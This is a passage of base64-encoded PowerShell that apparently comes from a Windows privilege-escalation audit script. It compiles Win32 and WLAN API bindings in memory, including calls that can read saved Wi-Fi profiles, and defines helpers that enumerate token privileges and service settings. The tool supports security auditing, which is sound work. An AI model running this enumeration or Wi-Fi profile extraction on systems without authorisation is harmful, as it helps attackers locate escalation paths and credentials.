zZXJ2ZWQsIG91dCB1aW50IHBkd05lZ290aWF0ZWRWZXJzaW9uLCBvdXQgSW50UHRyIGhDbGllbnRIYW5kbGUpOwoKW0RsbEltcG9ydCgiV2xhbmFwaS5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBXbGFuQ2xvc2VIYW5kbGUoSW50UHRyIGhDbGllbnRIYW5kbGUsIEludFB0ciBwUmVzZXJ2ZWQpOwoKW0RsbEltcG9ydCgiV2xhbmFwaS5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBXbGFuRW51bUludGVyZmFjZXMoSW50UHRyIGhDbGllbnRIYW5kbGUsIEludFB0ciBwUmVzZXJ2ZWQsIHJlZiBJbnRQdHIgcHBJbnRlcmZhY2VMaXN0KTsKCltEbGxJbXBvcnQoIldsYW5hcGkuZGxsIildCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHZvaWQgV2xhbkZyZWVNZW1vcnkoSW50UHRyIHBNZW1vcnkpOwoKW0RsbEltcG9ydCgiV2xhbmFwaS5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBXbGFuR2V0UHJvZmlsZUxpc3QoSW50UHRyIGhDbGllbnRIYW5kbGUsIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cnVjdCldR3VpZCBpbnRlcmZhY2VHdWlkLCBJbnRQdHIgcFJlc2VydmVkLCBvdXQgSW50UHRyIHBwUHJvZmlsZUxpc3QpOwoKW0RsbEltcG9ydCgiV2xhbmFwaS5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBXbGFuR2V0UHJvZmlsZShJbnRQdHIgY2xpZW50SGFuZGxlLCBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBTdHJ1Y3QpXSBHdWlkIGludGVyZmFjZUd1aWQsIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFdTdHIpXSBzdHJpbmcgcHJvZmlsZU5hbWUsIEludFB0ciBwUmVzZXJ2ZWQsIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFdTdHIpXSBvdXQgc3RyaW5nIHByb2ZpbGVYbWwsIHJlZiB1aW50IGZsYWdzLCBvdXQgdWludCBwZHdHcmFudGVkQWNjZXNzKTsKJ0AKCnRyeSB7CiAgICAjIElzIHRoZSBUeXBlIGFscmVhZHkgZGVmaW5lZD8KICAgIFtQcml2ZXNjQ2hlY2suV2luMzJdIHwgT3V0LU51bGwgCn0gY2F0Y2ggewogICAgIyBJZiBub3QsIGNyZWF0ZSBpdCBieSBjb21waWxpbmcgdGhlIEMjIGNvZGUgaW4gbWVtb3J5IAogICAgJENvbXBpbGVyUGFyYW1ldGVycyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5Db2RlRG9tLkNvbXBpbGVyLkNvbXBpbGVyUGFyYW1ldGVycwogICAgJENvbXBpbGVyUGFyYW1ldGVycy5HZW5lcmF0ZUluTWVtb3J5ID0gJFRydWUKICAgICRDb21waWxlclBhcmFtZXRlcnMuR2VuZXJhdGVFeGVjdXRhYmxlID0gJEZhbHNlIAogICAgIyRDb21waWxlciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyCiAgICAjJENvbXBpbGVyLkNvbXBpbGVBc3NlbWJseUZyb21Tb3VyY2UoJENvbXBpbGVyUGFyYW1ldGVycywgJENTaGFycFNvdXJjZSkgCiAgICBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkQ1NoYXJwU291cmNlIC1OYW1lICdXaW4zMicgLU5hbWVzcGFjZSAnUHJpdmVzY0NoZWNrJyAtTGFuZ3VhZ2UgQ1NoYXJwIC1Db21waWxlclBhcmFtZXRlcnMgJENvbXBpbGVyUGFyYW1ldGVycwp9CiNlbmRyZWdpb24gV2luMzIKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEhlbHBlcnMgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojcmVnaW9uIEhlbHBlcnMgCgpmdW5jdGlvbiBDb252ZXJ0LVNpZFRvTmFtZSB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgSGVscGVyIC0gQ29udmVydHMgYSBTSUQgc3RyaW5nIHRvIGl0cyBjb3JyZXNwb25kaW5nIHVzZXJuYW1lCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBUaGlzIGhlbHBlciBmdW5jdGlvbiB0YWtlcyBhIHVzZXIgU0lEIGFzIGFuIGlucHV0IHBhcmFtZXRlciBhbmQgcmV0dXJucyB0aGUgYWNjb3VudCBuYW1lIAogICAgYXNzb2NpYXRlZCB0byB0aGlzIFNJRC4gSWYgYW4gYWNjb3VudCBuYW1lIGNhbm5vdCBiZSBmb3VuZCwgbm90aGluZyBpcyByZXR1cm5lZC4KICAgIAogICAgLlBBUkFNRVRFUiBTaWQKCiAgICBBIHVzZXIgYWNjb3VudCBTSUQsIGUuZy46IFMtMS01LTE4LgogICAgCiAgICAuRVhBTVBMRQogICAgQW4gZXhhbXBsZQogICAgUFMgQzpcPiBDb252ZXJ0LVNpZFRvTmFtZSAtU2lkIFMtMS01LTE4IgoKICAgIE5UIEFVVEhPUklUWVxTWVNURU0KICAgIAogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbc3RyaW5nXSRTaWQKICAgICkKCiAgICB0cnkgewogICAgICAgICRTaWRPYmogPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRTaWQpCiAgICAgICAgJFNpZE9iai5UcmFuc2xhdGUoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50XSkgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBWYWx1ZQogICAgfSBjYXRjaCB7CiAgICAgICAgIyBEbyBub3RoaW5nCiAgICB9Cn0KCmZ1bmN0aW9uIENvbnZlcnQtRGF0ZVRvU3RyaW5nIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBIZWxwZXIgLSBDb252ZXJ0cyBhIERhdGVUaW1lIG9iamVjdCB0byBhIHN0cmluZyByZXByZXNlbnRhdGlvbgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgVGhlIG91dHB1dCBzdHJpbmcgaXMgYSBzaW1wbGlmaWVkIHZlcnNpb24gb2YgdGhlIElTTyBmb3JtYXQ6IFlZWVktTU0tREQgaGg6bW06c3MuIAogICAgCiAgICAuUEFSQU1FVEVSIERhdGUKCiAgICBBIFN5c3RlbS5EYXRlVGltZSBvYmplY3QKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+ICREYXRlID0gR2V0LURhdGU7IENvbnZlcnQtRGF0ZVRvU3RyaW5nIC1EYXRlICREYXRlCgogICAgMjAyMC0wMS0xNiAtIDEwOjI2OjExCiAgICAKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtTeXN0ZW0uRGF0ZVRpbWVdCiAgICAgICAgJERhdGUKICAgICkKCiAgICAkT3V0U3RyaW5nID0gIiIKICAgICRPdXRTdHJpbmcgKz0gJERhdGUuVG9TdHJpbmcoJ3l5eXktTU0tZGQgLSBISDptbTpzcycpCiAgICAjJE91dFN0cmluZyArPSAiICgkKCREYXRlLlRvU3RyaW5nKCdvJykpKSIgIyBJU08gZm9ybWF0CiAgICAkT3V0U3RyaW5nCn0KCmZ1bmN0aW9uIENvbnZlcnQtU2VydmljZVR5cGVUb1N0cmluZyB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgSGVscGVyIC0gQ29udmVydHMgYSBzZXJ2aWNlIHR5cGUgKGludGVnZXIpIHRvIGl0cyBhY3R1YWwgbmFtZQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgU2VydmljZXMgaGF2ZSBhIHR5cGUgd2hpY2ggaXMgc2F2ZWQgYXMgYW4gaW50ZWdlciBpbiB0aGUgcmVnaXN0cnkuIFRoaXMgZnVuY3Rpb24gd2lsbCByZXRyaWV2ZQogICAgdGhlICJuYW1lIiBvZiB0aGUgdHlwZSBiYXNlZCBvbiB0aGlzIGludGVnZXIgdmFsdWUuCiAgICAKICAgIC5QQVJBTUVURVIgU2VydmljZVR5cGUKCiAgICBBIHNlcnZpY2UgdHlwZSBhcyBhbiBpbnRlZ2VyCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBDb252ZXJ0LVNlcnZpY2VUeXBlVG9TdHJpbmcgLVNlcnZpY2VUeXBlIDE2CiAgICAKICAgIFdpbjMyT3duUHJvY2VzcwogICAgCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbaW50XQogICAgICAgICRTZXJ2aWNlVHlwZQogICAgKQoKICAgICRTZXJ2aWNlVHlwZUVudW0gPSBAewogICAgICAgICJLZXJuZWxEcml2ZXIiID0gICAgICAgICIxIjsKICAgICAgICAiRmlsZVN5c3RlbURyaXZlciIgPSAgICAiMiI7CiAgICAgICAgIkFkYXB0ZXIiID0gICAgICAgICAgICAgIjQiOwogICAgICAgICJSZWNvZ25pemVyRHJpdmVyIiA9ICAgICI4IjsKICAgICAgICAiV2luMzJPd25Qcm9jZXNzIiA9ICAgICAiMTYiOwogICAgICAgICJXaW4zMlNoYXJlUHJvY2VzcyIgPSAgICIzMiI7CiAgICAgICAgIkludGVyYWN0aXZlUHJvY2VzcyIgPSAgIjI1NiI7CiAgICB9CgogICAgJFNlcnZpY2VUeXBlRW51bS5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7IAogICAgICAgIGlmICggJF8udmFsdWUgLWJhbmQgJFNlcnZpY2VUeXBlICkgCiAgICAgICAgewogICAgICAgICAgICAkXy5uYW1lCiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBDb252ZXJ0LVNlcnZpY2VTdGFydE1vZGVUb1N0cmluZyB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgSGVscGVyIC0gQ29udmVydCBhIFN0YXJ0IG1vZGUgKGludGVnZXIpIHRvIGl0cyBhY3R1YWwgbmFtZQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgU2VydmljZXMgaGF2ZSBhIFN0YXJ0IG1vZGUgKGUuZy46IEF1dG9tYXRpYyksIHdoaWNoIGlzIHNhdmVkIGFzIGFuIGludGVnZXIgaW4gdGhlIHJlZ2lzdHJ5LgogICAgVGhpcyBmdW5jdGlvbiB3aWxsIHJldHJpZXZlIHRoZSAibmFtZSIgb2YgdGhlIFN0YXJ0IG1vZGUgYmFzZWQgb24gdGhpcyBpbnRlZ2VyIHZhbHVlLiAKICAgIAogICAgLlBBUkFNRVRFUiBTdGFydE1vZGUKCiAgICBBIFN0YXJ0IG1vZGUgYXMgYW4gaW50ZWdlcgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gQ29udmVydC1TZXJ2aWNlU3RhcnRNb2RlVG9TdHJpbmcgLVN0YXJ0TW9kZSAyCgogICAgQXV0b21hdGljCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW2ludF0KICAgICAgICAkU3RhcnRNb2RlCiAgICApCgogICAgJFN0YXJ0TW9kZUVudW0gPSBAewogICAgICAgICJCb290IiA9ICAgICAgICAiMCI7CiAgICAgICAgIlN5c3RlbSIgPSAgICAgICIxIjsKICAgICAgICAiQXV0b21hdGljIiA9ICAgIjIiOwogICAgICAgICJNYW51YWwiID0gICAgICAiMyI7CiAgICAgICAgIkRpc2FibGVkIiA9ICAgICI0IjsKICAgIH0KCiAgICAkU3RhcnRNb2RlRW51bS5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7IAogICAgICAgIGlmICggJF8uVmFsdWUgLWVxICRTdGFydE1vZGUgKSAKICAgICAgICB7CiAgICAgICAgICAgICRfLk5hbWUKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIFRlc3QtSXNLbm93blNlcnZpY2UgewoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtvYmplY3RdJFNlcnZpY2UKICAgICkKCiAgICBpZiAoJFNlcnZpY2UpIHsKCiAgICAgICAgJEltYWdlUGF0aCA9ICRTZXJ2aWNlLkltYWdlUGF0aCAgICAgICAgCgogICAgICAgICRTZXBhcmF0aW9uQ2hhcmFjdGVyU2V0cyA9IEAoJyInLCAiJyIsICcgJywgImAiJyIsICciICcsICInICIsICJgIicgIikKCiAgICAgICAgRm9yRWFjaCgkU2VwYXJhdGlvbkNoYXJhY3RlclNldCBpbiAkU2VwYXJhdGlvbkNoYXJhY3RlclNldHMpIHsKCiAgICAgICAgICAgICRDYW5kaWRhdGVQYXRocyA9ICRJbWFnZVBhdGguU3BsaXQoJFNlcGFyYXRpb25DaGFyYWN0ZXJTZXQpIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICgkXy50cmltKCkgLW5lICcnKX0KCiAgICAgICAgICAgIEZvckVhY2goJENhbmRpZGF0ZVBhdGggaW4gJENhbmRpZGF0ZVBhdGhzKSB7CgogICAgICAgICAgICAgICAgJFRlbXBQYXRoID0gJChbU3lzdGVtLkVudmlyb25tZW50XTo6RXhwYW5kRW52aXJvbm1lbnRWYXJpYWJsZXMoJENhbmRpZGF0ZVBhdGgpKQogICAgICAgICAgICAgICAgJFRlbXBQYXRoUmVzb2x2ZWQgPSBSZXNvbHZlLVBhdGggLVBhdGggJFRlbXBQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEVycm9yUmVzb2x2ZVBhdGggCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkRXJyb3JSZXNvbHZlUGF0aCkgewoKICAgICAgICAgICAgICAgICAgICAkRmlsZSA9IEdldC1JdGVtIC1QYXRoICRUZW1wUGF0aFJlc29sdmVkIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEVycm9yR2V0SXRlbSAKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkRXJyb3JHZXRJdGVtKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEZpbGUuVmVyc2lvbkluZm8uTGVnYWxDb3B5cmlnaHQgLUxpa2UgIipNaWNyb3NvZnQgQ29ycG9yYXRpb24qIikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRUcnVlIAogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkRmFsc2UKfQoKZnVuY3Rpb24gR2V0LVVzZXJQcml2aWxlZ2VzIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBIZWxwZXIgLSBFbnVtZXJhdGVzIHRoZSBwcml2aWxlZ2VzIG9mIHRoZSBjdXJyZW50IHVzZXIgCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBFbnVtZXJhdGVzIHRoZSBwcml2aWxlZ2VzIG9mIHRoZSBjdXJyZW50IHVzZXIgdXNpbmcgdGhlIFdpbmRvd3MgQVBJLiBGaXJzdCwgaXQgZ2V0cyBhIGhhbmRsZSAKICAgIHRvIHRoZSBjdXJyZW50IGFjY2VzcyB0b2tlbiB1c2luZyBPcGVuUHJvY2Vzc1Rva2VuLiBUaGVuIGl0IGNhbGxzIEdldFRva2VuSW5mb3JtYXRpb24gdG8gbGlzdAogICAgYWxsIHRoZSBwcml2aWxlZ2VzIHRoYXQgaXQgY29udGFpbnMgYWxvbmcgd2l0aCB0aGVpciBzdGF0ZSAoZW5hYmxlZC9kaXNhYmxlZCkuIEZvciBlYWNoIHJlc3VsdAogICAgYSBjdXN0b20gb2JqZWN0IGlzIHJldHVybmVkLCBpbmRpY2F0aW5nIHRoZSBuYW1lIG9mIHRoZSBwcml2aWxlZ2UgYW5kIGl0cyBzdGF0ZS4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBHZXQtVXNlclByaXZpbGVnZXMKCiAgICBOYW1lICAgICAgICAgICAgICAgICAgICAgICAgICBTdGF0ZSAgICBEZXNjcmlwdGlvbgogICAgLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0tICAgLS0tLS0tLS0tLS0KICAgIFNlU2h1dGRvd25Qcml2aWxlZ2UgICAgICAgICAgIERpc2FibGVkIFNodXQgZG93biB0aGUgc3lzdGVtCiAgICBTZUNoYW5nZU5vdGlmeVByaXZpbGVnZSAgICAgICBFbmFibGVkICBCeXBhc3MgdHJhdmVyc2UgY2hlY2tpbmcKICAgIFNlVW5kb2NrUHJpdmlsZWdlICAgICAgICAgICAgIERpc2FibGVkIFJlbW92ZSBjb21wdXRlciBmcm9tIGRvY2tpbmcgc3RhdGlvbgogICAgU2VJbmNyZWFzZVdvcmtpbmdTZXRQcml2aWxlZ2UgRGlzYWJsZWQgSW5jcmVhc2UgYSBwcm9jZXNzIHdvcmtpbmcgc2V0CiAgICBTZVRpbWVab25lUHJpdmlsZWdlICAgICAgICAgICBEaXNhYmxlZCBDaGFuZ2UgdGhlIHRpbWUgem9uZQoKICAgIC5MSU5LCgogICAgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9zZWNhdXRoei9wcml2aWxlZ2UtY29uc3RhbnRzCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgZnVuY3Rpb24gR2V0LVByaXZpbGVnZURlc2NyaXB0aW9uIHsKICAgICAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICAgICAgW3N0cmluZ10KICAgICAgICAgICAgJE5hbWUKICAgICAgICApCgogICAgICAgICRQcml2aWxlZ2VEZXNjcmlwdGlvbnMgPSBAewogICAgICAgICAgICAiU2VBc3NpZ25QcmltYXJ5VG9rZW5Qcml2aWxlZ2UiID0gICAgICAgICAgICAgICAiUmVwbGFjZSBhIHByb2Nlc3MtbGV2ZWwgdG9rZW4iOwogICAgICAgICAgICAiU2VBdWRpdFByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAiR2VuZXJhdGUgc2VjdXJpdHkgYXVkaXRzIjsKICAgICAgICAgICAgIlNlQmFja3VwUHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAgICAgICAgIkJhY2sgdXAgZmlsZXMgYW5kIGRpcmVjdG9yaWVzIjsKICAgICAgICAgICAgIlNlQ2hhbmdlTm90aWZ5UHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAgIkJ5cGFzcyB0cmF2ZXJzZSBjaGVja2luZyI7CiAgICAgICAgICAgICJTZUNyZWF0ZUdsb2JhbFByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgICJDcmVhdGUgZ2xvYmFsIG9iamVjdHMiOwogICAgICAgICAgICAiU2VDcmVhdGVQYWdlZmlsZVByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAiQ3JlYXRlIGEgcGFnZWZpbGUiOwogICAgICAgICAgICAiU2VDcmVhdGVQZXJtYW5lbnRQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAiQ3JlYXRlIHBlcm1hbmVudCBzaGFyZWQgb2JqZWN0cyI7CiAgICAgICAgICAgICJTZUNyZWF0ZVN5bWJvbGljTGlua1ByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICJDcmVhdGUgc3ltYm9saWMgbGlua3MiOwogICAgICAgICAgICAiU2VDcmVhdGVUb2tlblByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgICAiQ3JlYXRlIGEgdG9rZW4gb2JqZWN0IjsKICAgICAgICAgICAgIlNlRGVidWdQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgICAgICAgIkRlYnVnIHByb2dyYW1zIjsKICAgICAgICAgICAgIlNlRGVsZWdhdGVTZXNzaW9uVXNlckltcGVyc29uYXRlUHJpdmlsZWdlIiA9ICAgIkltcGVyc29uYXRlIG90aGVyIHVzZXJzIjsKICAgICAgICAgICAgIlNlRW5hYmxlRGVsZWdhdGlvblByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgIkVuYWJsZSBjb21wdXRlciBhbmQgdXNlciBhY2NvdW50cyB0byBiZSB0cnVzdGVkIGZvciBkZWxlZ2F0aW9uIjsKICAgICAgICAgICAgIlNlSW1wZXJzb25hdGVQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgIkltcGVyc29uYXRlIGEgY2xpZW50IGFmdGVyIGF1dGhlbnRpY2F0aW9uIjsKICAgICAgICAgICAgIlNlSW5jcmVhc2VCYXNlUHJpb3JpdHlQcml2aWxlZ2UiID0gICAgICAgICAgICAgIkluY3JlYXNlIHNjaGVkdWxpbmcgcHJpb3JpdHkiOwogICAgICAgICAgICAiU2VJbmNyZWFzZVF1b3RhUHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAiQWRqdXN0IG1lbW9yeSBxdW90YXMgZm9yIGEgcHJvY2VzcyI7CiAgICAgICAgICAgICJTZUluY3JlYXNlV29ya2luZ1NldFByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICJJbmNyZWFzZSBhIHByb2Nlc3Mgd29ya2luZyBzZXQiOwogICAgICAgICAgICAiU2VMb2FkRHJpdmVyUHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAgICAiTG9hZCBhbmQgdW5sb2FkIGRldmljZSBkcml2ZXJzIjsKICAgICAgICAgICAgIlNlTG9ja01lbW9yeVByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgICAgIkxvY2sgcGFnZXMgaW4gbWVtb3J5IjsKICAgICAgICAgICAgIlNlTWFjaGluZUFjY291bnRQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgIkFkZCB3b3Jrc3RhdGlvbnMgdG8gZG9tYWluIjsKICAgICAgICAgICAgIlNlTWFuYWdlVm9sdW1lUHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAgIk1hbmFnZSB0aGUgZmlsZXMgb24gYSB2b2x1bWUiOwogICAgICAgICAgICAiU2VQcm9maWxlU2luZ2xlUHJvY2Vzc1ByaXZpbGVnZSIgPSAgICAgICAgICAgICAiUHJvZmlsZSBzaW5nbGUgcHJvY2VzcyI7CiAgICAgICAgICAgICJTZVJlbGFiZWxQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgICAgICJNb2RpZnkgYW4gb2JqZWN0IGxhYmVsIjsKICAgICAgICAgICAgIlNlUmVtb3RlU2h1dGRvd25Qcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgIkZvcmNlIHNodXRkb3duIGZyb20gYSByZW1vdGUgc3lzdGVtIjsKICAgICAgICAgICAgIlNlUmVzdG9yZVByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgICAgICAgIlJlc3RvcmUgZmlsZXMgYW5kIGRpcmVjdG9yaWVzIjsKICAgICAgICAgICAgIlNlU2VjdXJpdHlQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgICAgIk1hbmFnZSBhdWRpdGluZyBhbmQgc2VjdXJpdHkgbG9nIjsKICAgICAgICAgICAgIlNlU2h1dGRvd25Qcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgICAgIlNodXQgZG93biB0aGUgc3lzdGVtIjsKICAgICAgICAgICAgIlNlU3luY0FnZW50UHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAgICAgIlN5bmNocm9uaXplIGRpcmVjdG9yeSBzZXJ2aWNlIGRhdGEiOwogICAgICAgICAgICAiU2VTeXN0ZW1FbnZpcm9ubWVudFByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAiTW9kaWZ5IGZpcm13YXJlIGVudmlyb25tZW50IHZhbHVlcyI7CiAgICAgICAgICAgICJTZVN5c3RlbVByb2ZpbGVQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICJQcm9maWxlIHN5c3RlbSBwZXJmb3JtYW5jZSI7CiAgICAgICAgICAgICJTZVN5c3RlbXRpbWVQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgICJDaGFuZ2UgdGhlIHN5c3RlbSB0aW1lIjsKICAgICAgICAgICAgIlNlVGFrZU93bmVyc2hpcFByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgIlRha2Ugb3duZXJzaGlwIG9mIGZpbGVzIG9yIG90aGVyIG9iamVjdHMiOwogICAgICAgICAgICAiU2VUY2JQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWN0IGFzIHBhcnQgb2YgdGhlIG9wZXJhdGluZyBzeXN0ZW0iOwogICAgICAgICAgICAiU2VUaW1lWm9uZVByaXZpbGVnZSIgPSAgICAgICAgICAgICAgICAgICAgICAgICAiQ2hhbmdlIHRoZSB0aW1lIHpvbmUiOwogICAgICAgICAgICAiU2VUcnVzdGVkQ3JlZE1hbkFjY2Vzc1ByaXZpbGVnZSIgPSAgICAgICAgICAgICAiQWNjZXNzIENyZWRlbnRpYWwgTWFuYWdlciBhcyBhIHRydXN0ZWQgY2FsbGVyIjsKICAgICAgICAgICAgIlNlVW5kb2NrUHJpdmlsZWdlIiA9ICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJlbW92ZSBjb21wdXRlciBmcm9tIGRvY2tpbmcgc3RhdGlvbiI7CiAgICAgICAgICAgICJTZVVuc29saWNpdGVkSW5wdXRQcml2aWxlZ2UiID0gICAgICAgICAgICAgICAgICJOL0EiOwogICAgICAgIH0KCiAgICAgICAgJFByaXZpbGVnZURlc2NyaXB0aW9uc1skTmFtZV0KCiAgICB9CgogICAgIyBHZXQgYSBoYW5kbGUgdG8gYSBwcm9jZXNzIHRoZSBjdXJyZW50IHVzZXIgb3ducyAKICAgICRQcm9jZXNzSGFuZGxlID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OkdldEN1cnJlbnRQcm9jZXNzKCkKICAgIFdyaXRlLVZlcmJvc2UgIkN1cnJlbnQgcHJvY2VzcyBoYW5kbGU6ICRQcm9jZXNzSGFuZGxlIgoKICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSB0b2tlbiBjb3JyZXNwb25kaW5nIHRvIHRoaXMgcHJvY2VzcyAKICAgICRUT0tFTl9RVUVSWT0gMHgwMDA4CiAgICBbSW50UHRyXSRUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAkU3VjY2VzcyA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpPcGVuUHJvY2Vzc1Rva2VuKCRQcm9jZXNzSGFuZGxlLCAkVE9LRU5fUVVFUlksIFtyZWZdJFRva2VuSGFuZGxlKTsKICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICBpZiAoJFN1Y2Nlc3MpIHsKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiT3BlblByb2Nlc3NUb2tlbigpIE9LIC0gVG9rZW4gaGFuZGxlOiAkVG9rZW5IYW5kbGUiCgogICAgICAgICMgVE9LRU5fSU5GT1JNQVRJT05fQ0xBU1MgLSAzID0gVG9rZW5Qcml2aWxlZ2VzCiAgICAgICAgJFRva2VuUHJpdmlsZWdlc1B0clNpemUgPSAwCiAgICAgICAgJFN1Y2Nlc3MgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6R2V0VG9rZW5JbmZvcm1hdGlvbigkVG9rZW5IYW5kbGUsIDMsIDAsICROdWxsLCBbcmVmXSRUb2tlblByaXZpbGVnZXNQdHJTaXplKQogICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgaWYgKC1ub3QgKCRUb2tlblByaXZpbGVnZXNQdHJTaXplIC1lcSAwKSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0VG9rZW5JbmZvcm1hdGlvbigpIE9LIC0gVG9rZW5Qcml2aWxlZ2VzUH